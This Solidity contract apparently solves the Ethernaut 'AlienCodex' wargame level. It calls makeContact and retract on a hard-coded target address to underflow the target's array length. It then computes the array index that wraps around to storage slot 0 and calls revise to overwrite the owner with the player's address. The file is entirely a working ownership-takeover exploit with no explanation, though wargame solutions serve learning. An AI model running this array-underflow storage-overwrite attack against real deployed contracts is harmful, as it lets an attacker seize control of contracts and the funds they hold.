// SPDX-License-Identifier: MIT
pragma solidity ^0.8.*;

contract AlienCodex {

    address target = 0xF95545F9b101c0974AcD92DBbeF2d5524a838354;
    address player = 0xD64D08C68F6940281c51108734B5b5DA95f62BD5;
    event TestBool(bool);
    event TestUint(uint256);

    function contact() public {

        bytes memory payload = abi.encodeWithSignature("makeContact()");
        (bool success, ) = target.call(payload);
        emit TestBool(success);
    }

    function underflow() public {

        bytes memory payload = abi.encodeWithSignature("retract()");
        (bool success, ) = target.call(payload);
        emit TestBool(success);
    }

    function yoink() public {

        uint256 start_addr = uint256(keccak256(abi.encode(0x1))); // The slot of the array
        emit TestUint(start_addr);
        uint256 target_slot = 0x0; // slot of the owner variable
        uint256 final_addr = type(uint256).max - start_addr + target_slot + 1;
        bytes32 slot_content = bytes32(uint256(uint160(player)));
        bytes memory payload = abi.encodeWithSignature("revise(uint256,bytes32)", final_addr, slot_content);
        (bool success, ) = target.call(payload);
        emit TestBool(success);
    }
}